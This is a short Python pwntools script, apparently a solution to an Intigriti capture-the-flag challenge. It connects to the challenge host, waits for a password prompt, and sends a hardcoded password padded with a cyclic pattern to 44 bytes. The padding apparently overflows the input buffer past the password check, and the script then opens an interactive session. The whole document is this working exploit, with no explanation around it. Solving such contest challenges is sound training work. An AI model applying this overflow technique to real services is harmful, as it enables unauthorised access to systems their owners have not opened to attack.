from pwn import *

r = remote('irrorversible.ctf.intigriti.io', 1331)

r.recvuntil(b'Enter password: ')

password = b'SuPeRsEcUrEPaSsWoRd123'
payload = flat([
    password,
    cyclic(44 - len(password))
])

r.sendline(payload)

r.interactive()
